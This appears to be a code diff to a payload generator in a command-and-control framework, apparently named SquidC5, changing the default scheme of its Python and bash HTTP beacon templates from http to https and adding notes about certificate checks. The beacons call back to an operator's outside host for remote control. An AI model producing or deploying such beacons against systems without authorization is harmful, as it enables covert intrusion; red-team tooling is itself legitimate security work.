@@ -115,11 +115,13 @@ class PayloadGenerator:
         decoys_json = json.dumps(decoys)
         resp_pref = json.dumps(extra.get("response_prefix") or "")
         resp_suf = json.dumps(extra.get("response_suffix") or "")
-        scheme = (extra.get("scheme") or "http").lower()
+        scheme = (extra.get("scheme") or "https").lower()
         if scheme not in ("http", "https"):
-            scheme = "http"
+            scheme = "https"
         return f'''#!/usr/bin/env python3
 # SquidC5 HTTP beacon — authorized testing only (profile-aware)
+# HTTPS verifies system CAs. For lab self-signed, terminate TLS on a redirector
+# or use scheme=http on an isolated lab network.
 import json, random, time, urllib.request, ssl
 BASE = "{scheme}://{host}:{port}"
 PATH = {json.dumps(path)}
@@ -209,9 +211,13 @@ while True:
         jitter = float(extra.get("jitter_pct") or 0)
         # For bash, use flat JSON if template is complex; profile wrap is python-primary
         # Keep body as flat beacon for reliability in bash
+        scheme = (extra.get("scheme") or "https").lower()
+        if scheme not in ("http", "https"):
+            scheme = "https"
         return f'''#!/bin/bash
 # SquidC5 HTTP beacon — authorized testing only (profile-aware path/UA)
-C2="http://{host}:{port}{path}"
+# HTTPS verifies system CAs (no curl -k). Use redirector or scheme=http in lab.
+C2="{scheme}://{host}:{port}{path}"
 UA="{ua}"
 SLEEP_BASE={sleep_base}
 JITTER={jitter}
